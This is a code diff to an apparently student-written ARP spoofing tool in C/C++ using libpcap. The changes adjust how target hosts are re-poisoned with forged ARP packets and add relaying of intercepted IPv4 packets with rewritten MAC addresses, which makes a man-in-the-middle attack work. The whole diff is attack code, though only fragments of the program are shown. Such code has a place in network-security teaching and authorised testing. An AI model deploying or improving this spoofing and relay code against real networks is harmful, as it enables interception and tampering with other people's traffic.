@@ -54,6 +54,7 @@ void ARPinfect(pcap_t* handle, Mac eth_smac, Mac eth_dmac,uint16_t op, Mac arp_s
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP,MyAddr attacker);
 void ARPreInfect(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker);
 void spoofedIPpacket(pcap_t* handle, Mac smac, Mac dmac, Ip sip);
+void packetRelay();
 
 bool EXIT = true;
 
@@ -150,7 +151,7 @@ MyAddr getAttackerAddr(char *dev)
             regfree(&regexComMac);
         }
 
-        if(fIP==1 && fMAC==1)       // ....Why?...
+        if(fIP==1 && fMAC==1)
         {
             return attacker;
         }
@@ -238,9 +239,9 @@ void ARPreInfect(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker)
 
         struct EthArpPacket* etharp = (EthArpPacket *)packet;
 
-        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op()==ArpHdr::Request && etharp->arp_.sip()== sIP && etharp->arp_.tip()==tIP)
+        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== sIP && etharp->arp_.tip()==tIP)
         {
-            ARPinfect(handle,attacker.mac_,Mac::broadcastMac(),ArpHdr::Reply,attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
+            ARPinfect(handle,attacker.mac_,Mac::broadcastMac(),ArpHdr::Request,attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
             break;
         }
 
@@ -269,7 +270,10 @@ void spoofedIPpacket(pcap_t* handle, Mac smac, Mac dmac, Ip sip,Ip tip,MyAddr at
 
         if(ethip->eth_.type() == EthHdr::Ip4 && ethip->ip_.saddr==sip && ethip->ip_.daddr!=attacker.ip_)
         {
-            ARPinfect(handle, smac,dmac,ArpHdr::Request, smac, attacker.ip_, dmac, tip);
+            ethip->eth_.smac_=attacker.mac_;
+            ethip->eth_.dmac_=dmac;
+            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthIpPacket));
+
             break;
         }
 
